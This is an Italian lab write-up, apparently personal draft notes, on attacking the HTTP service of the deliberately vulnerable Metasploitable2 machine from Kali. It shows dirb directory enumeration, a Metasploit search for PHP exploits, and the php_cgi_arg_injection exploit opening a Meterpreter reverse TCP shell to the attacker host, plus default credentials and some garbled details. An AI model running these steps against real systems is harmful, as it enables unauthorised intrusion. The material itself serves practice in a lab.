L'HyperText Transfer Protocol (HTTP) è un protocollo a livello applicativo usato per la trasmissione d'informazioni sul web. Un server HTTP generalmente resta in ascolto delle richieste dei client sulla porta 80 usando il protocollo TCP a livello di trasporto; mentre sulla porta 443 si usa il più ben noto HTTP, la differenza sta nell'uso di un protocollo di crittografia attraverso TLS.

Gli attacchi a questo protocollo sono i più disparati vanno dal bypass dell'autenticazione dal lato client, fino al XSS (cross site scripting).

Vedremo adesso come sarebbe possibile accedere alla macchina metasploitable2 attraverso varie strade:
La più semplice consiste nel fare proprio il footprinting del servizio, quindi per prima cosa colleghiamoci ad esso attraverso un browser

<img src="/imgs/HTTP_grabbing.png" width="400"> </br>

Come al solito l'informazione che otteniamo per accedere al terminale è msfadmin/

Ma passiamo a qualcosa di più interessante. Per prima cosa utilizziamo un tool già installato sulla nostra macchina Kali, ovvero Dirb, il quale si occupa di fare __Web Context Scanner__ e quindi si occupa di trovare tutti i Web Object (nascosti o meno). Sostanzialmente funziona lanciando un attacco basato su dizionario, presente già sulla macchina Kali all'indirizzo __"/usr/share/wordlists/dirb/big.txt"__, e analizzando le risposte che ci vengono fornite.

Le pagine HTTP presentano una serie di valori in base allo stato della pagina, l'elenco è facilmente trovabile online https://it.wikipedia.org/wiki/Codici_di_stato_HTTP.

Ora per le nostre necessità abbiamo bisogno di lanciare il seguente comando, il quale si occuperà di usare il dizionario __big.txt__ con il flag __-X__ effettuiamo la ricerca per trovare i path presenti nel dizionario con estensione __.php__. Se lo lanciassimo senza quest'opzione troverebbe tutti i possibili percorsi nascosti che combaciano con quelli nel dizionario.

Il risultato è mostrato di seguito:
```
root@kali:~# dirb http://192.168.139.129 /usr/share/wordlists/dirb/big.txt -X .php

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Dec 12 23:43:37 2021
URL_BASE: http://192.168.139.129/
WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt
EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://192.168.139.129/ ----
+ http://192.168.139.129/index.php (CODE:200|SIZE:891)                                                                                                    
+ http://192.168.139.129/phpinfo.php (CODE:200|SIZE:48119)                                                                                                
                                                                                                                                                          
-----------------
END_TIME: Sun Dec 12 23:44:01 2021
DOWNLOADED: 20458 - FOUND: 2

```

La cosa più bella di Dirb è che i risultati ottenuti possono essere aperti direttamente fornendo una vista del risultato

<img src="/imgs/HTTP_Dirb.png" width="500"> </br>

Così facendo abbiamo la possibilità di usare il file per effettuare l'enumerazione di tutti i servizi attivi e le risorse della macchina. Ma torniamo all'utilizzo di metasploit, il file __phpinfo.php__ ci dà anche informazioni sulla versione di php attiva sul server. Vediamo cosa trova metasploid:
```
root@kali:~# msfconsole

msf6 > search php 5.4.2

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/multi/http/op5_license                       2012-01-05       excellent  Yes    OP5 license.php Remote Command Execution
   1  exploit/multi/http/php_cgi_arg_injection             2012-05-03       excellent  Yes    PHP CGI Argument Injection
   2  exploit/windows/http/php_apache_request_headers_bof  2012-05-08       normal     No     PHP apache_request_headers Function Buffer Overflow


Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/http/php_apache_request_headers_bof
```

Abbiamo non uno ma ben tre exploit disponibili, di cui due con una classificazione __Excellent__ concentramoci su questi. Il primo __exploit/multi/http/op5_license__ ci permette di eseguire comandi da remoto come root sulla macchina targhet, il nostro compito è quindi mandare un payload da far eseguire per garantirci una shell sulla macchina.

--__DEVO CAPIRE UN ATTIMO STA PARTE PERCHé NON L'HO SCRITTA BENE ma a quanto pare di default usa il payload php/meterpreter/reverse_tcp nello specifico un reverse_tcp permette di aprire una connessione ma dal target a me, in questo modo un firewall non blocca niente__

Mentre la seconda opzione __exploit/multi/http/php_cgi_arg_injection__ ci informa sulla vulnerabiltià di argument injection. Nello specifico questo modulo sfrutta il flag __-d__ per impostare l'esecuzione di codice nella pagina php.ini.

__--Sono arrivato qui ed ho pure fatto l'exploit, solo che non sono sicuro di aver avuto accesso all'altra macchina ma penso più alla mia .-. LOL cmq devo capire un attimos /129 è la target 128 sono io__
```
msf6 exploit(multi/http/php_cgi_arg_injection) > set lhost 192.168.139.128
lhost => 192.168.139.128
msf6 exploit(multi/http/php_cgi_arg_injection) > set rhost 192.168.139.129
rhost => 192.168.139.129
msf6 exploit(multi/http/php_cgi_arg_injection) > exploit

[*] Started reverse TCP handler on 192.168.139.128:4444 
[*] Sending stage (39282 bytes) to 192.168.139.129
[*] Meterpreter session 1 opened (192.168.139.128:4444 -> 192.168.139.129:41864) at 2021-12-13 00:45:40 -0500

meterpreter > sessions
Usage: sessions <id>

Interact with a different session Id.
This works the same as calling this from the MSF shell: sessions -i <session id>
```

